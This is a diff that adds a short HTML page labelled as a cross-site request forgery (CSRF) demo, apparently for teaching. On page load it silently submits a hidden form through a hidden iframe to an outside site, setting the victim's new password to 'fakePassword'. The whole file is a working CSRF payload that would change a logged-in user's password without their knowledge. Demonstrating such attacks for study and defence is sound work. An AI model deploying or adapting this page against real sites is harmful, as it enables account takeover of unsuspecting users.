@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Forgery Form Used for CSRF DEMO</title>
+</head>
+<body onload="document.csrfForm.submit()">
+  <h3>Forgery Form Used for CSRF DEMO</h3>
+  <form action="http://www.tjcchen.cn" method="POST" target="hiddenFrame" name="csrfForm">
+    <input type="hidden" name="newPassword" value="fakePassword" />
+    <input type="hidden" name="confirmPassword" value="fakePassword" />
+  </form>
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
+</body>
+</html>
